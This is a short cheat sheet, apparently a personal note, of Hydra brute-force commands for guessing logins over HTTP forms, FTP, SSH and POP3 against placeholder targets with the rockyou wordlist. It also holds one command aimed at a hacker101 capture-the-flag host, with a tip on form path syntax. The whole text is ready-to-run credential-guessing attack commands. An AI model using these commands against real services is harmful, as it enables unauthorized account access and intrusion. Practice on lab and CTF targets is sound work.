hydra -l <username> -p <password> <server> <service> -s <port> -t <thread> -o <output>
hydra -L <usernames> -P <passwords>

[http]  hydra -l admin -P /usr/share/wordlists/rockyou.txt target.ip -s 80 http-post-form "/login.php:username=admin&password=^PASS^:Invalid Password!"
        hydra -l phillips -P /usr/share/wordlists/rockyou.txt target.ip  http-form-get '/login-get/index.php:username=^USER^&password=^PASS^:Login failed!'
[ftp]   hydra -L username.txt -P password.txt target.ip ftp -s 21
[ssh]   hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.ip -o hydra.ssh
[pop3]  hydra -I -L usernames.txt -P passwords.txt pop3://target.ip -t 64 -o hydra.pop3



hydra -v -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -p password1 ef26734dbe646949c019bdd1c731d5b3.ctf.hacker101.com -S -t 16 http-post-form '/secure-login/:username=^USER^&password=^PASS^:F=Invalid Username'

the / after '/secure-login is very important